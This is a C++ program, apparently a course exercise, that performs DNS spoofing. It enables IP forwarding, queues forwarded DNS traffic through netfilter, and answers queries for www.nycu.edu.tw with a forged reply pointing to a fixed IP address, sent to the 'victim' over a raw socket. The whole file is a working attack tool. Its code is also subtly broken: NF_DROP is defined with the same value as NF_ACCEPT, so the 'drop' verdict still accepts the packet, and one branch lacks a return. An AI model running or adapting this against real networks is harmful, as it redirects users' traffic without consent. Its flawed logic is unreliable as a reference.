#include <libnetfilter_queue/libnetfilter_queue.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <cstring>
#include <iostream>
#include <cstdlib>
#include <unistd.h>

using namespace std;

#define NF_ACCEPT 1
#define NF_DROP 1
#define DNS_PORT 53
#define DNS_HEADER_SIZE 12


uint16_t checksum(uint16_t* data, int len) {
    uint32_t sum = 0;
    while (len > 1) {
        sum += *data++;
        len -= 2;
    }
    if (len > 0) sum += *(uint8_t*)data;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}

// UDP checksum with pseudo-header
uint16_t udp_checksum(struct ip* iph, struct udphdr* udph) {
    struct pseudo_header {
        uint32_t src;
        uint32_t dst;
        uint8_t zero;
        uint8_t protocol;
        uint16_t length;
    } ph;

    ph.src = iph->ip_src.s_addr;
    ph.dst = iph->ip_dst.s_addr;
    ph.zero = 0;
    ph.protocol = IPPROTO_UDP;
    ph.length = udph->len;

    int total_len = sizeof(ph) + ntohs(udph->len);
    unsigned char* buf = new unsigned char[total_len];
    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf + sizeof(ph), udph, ntohs(udph->len));

    uint16_t result = checksum((uint16_t*)buf, total_len);
    delete[] buf;
    return result;
}

// DNS format example 
// 03 77 77 77       label 1: "www"
// 04 6e 79 63 75    label 2: "nycu"
// 03 65 64 75       label 3: "edu"
// 02 74 77          label 4: "tw"
// 00                null byte
string parse_domain(unsigned char* dns, size_t& dns_offset, size_t max_len) {
    string domain;

    // dns_offset starts from dns question part (variable bits) 
    while (dns_offset < max_len && dns[dns_offset] != 0) {
        int len = dns[dns_offset];
        if (dns_offset + len >= max_len) break; 
        for (int i = 1; i <= len; ++i) domain += dns[dns_offset + i];
        domain += ".";
        dns_offset += len + 1;
    }
    if (!domain.empty()) domain.pop_back();  
    dns_offset += 1;  
    return domain;
}

// Packet processing callback
static int packetHandler(struct nfq_q_handle* queue, struct nfgenmsg*, struct nfq_data* packet, void*) {
   
    // packet_data will point to payload, starts from ip header
    unsigned char* packet_data = nullptr;
    int len = nfq_get_payload(packet, &packet_data);
    uint32_t id = ntohl(nfq_get_msg_packet_hdr(packet)->packet_id); 

    if (len < 0) return nfq_set_verdict(queue, id, NF_ACCEPT, 0, nullptr);

    struct ip* ip_header = (struct ip*)packet_data;
    if (ip_header->ip_p != IPPROTO_UDP) nfq_set_verdict(queue, id, NF_ACCEPT, 0, nullptr);


    struct udphdr* udp_header = (struct udphdr*)(packet_data + (ip_header->ip_hl * 4));
    if (ntohs(udp_header->dest) != DNS_PORT && ntohs(udp_header->source) != DNS_PORT)
        return nfq_set_verdict(queue, id, NF_ACCEPT, 0, nullptr);

    unsigned char* dns = packet_data + (ip_header->ip_hl * 4) + sizeof(struct udphdr);

    size_t dns_offset = DNS_HEADER_SIZE;
    int udp_len = ntohs(udp_header->len);
    int dns_len = udp_len - sizeof(struct udphdr);

    string domain = parse_domain(dns, dns_offset, dns_len);

    // Skip QTYPE and QCLASS (4 bytes)
    dns_offset += 4;

    // check if this dns is a request packet to www.nycu.edu.tw 
    if ((dns[2] & 0x80) == 0 && domain == "www.nycu.edu.tw") {
    
        // Set DNS 12 bytes header 
        dns[2] |= 0x80; // Set QR = 1 (response)
        dns[3] = 0x00;  // RCODE = 0 (no error)
        dns[6] = 0x00; dns[7] = 0x01;   // answer count
        dns[8] = 0x00; dns[9] = 0x00;   // authority records
        dns[10] = 0x00; dns[11] = 0x00; // additional records
        
        // answer section starts after question section
        int question_len = dns_offset;

        // add answer (16 bytes total)
        dns[question_len + 0] = 0xC0; dns[question_len + 1] = 0x0C; // pointer to QNAME
        dns[question_len + 2] = 0x00; dns[question_len + 3] = 0x01; // TYPE A
        dns[question_len + 4] = 0x00; dns[question_len + 5] = 0x01; // CLASS IN
        dns[question_len + 6] = 0x00; dns[question_len + 7] = 0x00;
        dns[question_len + 8] = 0x00; dns[question_len + 9] = 0x3C; // TTL = 60
        dns[question_len + 10] = 0x00; dns[question_len + 11] = 0x04; // RDLENGTH = 4
        
        //destination port: 140.113.24.241
        dns[question_len + 12] = 140;
        dns[question_len + 13] = 113;
        dns[question_len + 14] = 24;
        dns[question_len + 15] = 241;
    

        // Update UDP headers
        int new_dns_len = dns_offset + 16;
        int new_udp_len = sizeof(struct udphdr) + new_dns_len;
        int new_ip_len = (ip_header->ip_hl * 4) + new_udp_len;

        
        udp_header->dest = udp_header->source;
        udp_header->source = htons(53);
        udp_header->len = htons(new_udp_len);
        udp_header->check = 0;
        udp_header->check = udp_checksum(ip_header, udp_header);


        // Update IP headers
        struct in_addr temp = ip_header->ip_dst;
        ip_header->ip_dst = ip_header->ip_src;
        ip_header->ip_src = temp;

        ip_header->ip_len = htons(new_ip_len);
        ip_header->ip_sum = 0;
        ip_header->ip_sum = checksum((uint16_t*)ip_header, ip_header->ip_hl * 4);
    

        // Forge DNS response and send via raw socket
        unsigned char fake_dns_reply[65536];
        memcpy(fake_dns_reply, ip_header, new_ip_len); // include IP + UDP + DNS
    
        // Create raw socket to send forged packet
        int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (raw_sock < 0) {
            perror("socket");
        }
    
        // Set IP_HDRINCL to tell kernel we provide IP header
        int one = 1;
        setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
        // Send forged response to victim
        struct sockaddr_in dst{};
        dst.sin_family = AF_INET;
        dst.sin_addr.s_addr = ip_header->ip_dst.s_addr;
    
        if (sendto(raw_sock, fake_dns_reply, new_ip_len, 0, (struct sockaddr*)&dst, sizeof(dst)) < 0) {
            perror("sendto");
        } else {
            cout << "[+] Spoofed DNS response sent to victim." << endl;
        }
    
        close(raw_sock);
    
        // Drop original request
        return nfq_set_verdict(queue, id, NF_DROP, 0, nullptr);
    
    } else {
        // Let other packets go through
        return nfq_set_verdict(queue, id, NF_ACCEPT, 0, nullptr);
    }
    
}


int main() {
    // Enable IP forwarding
    system("sysctl net.ipv4.ip_forward=1");

    // Forward packets with destination port 53 to NFQUEUE
    system("iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");

    // open a netfilter queue handler
    struct nfq_handle* handler = nfq_open();
    if (!handler) {
        cerr << "[-] Error opening nfq handle\n";
        return 1;
    }
    
    nfq_unbind_pf(handler, AF_INET);
    nfq_bind_pf(handler, AF_INET);

    // create a netfilter queue num 0 
    struct nfq_q_handle* queue = nfq_create_queue(handler, 0, &packetHandler, nullptr);

    // recieve the whole package from kernel space 
    nfq_set_mode(queue, NFQNL_COPY_PACKET, 0xffff);

    int fd = nfq_fd(handler);
    char buffer[4096] __attribute__((aligned));

    while (true) {
        int rv = recv(fd, buffer, sizeof(buffer), 0);
        if (rv >= 0) nfq_handle_packet(handler, buffer, rv);
    }

    nfq_destroy_queue(queue);
    nfq_close(handler);
    return 0;
}
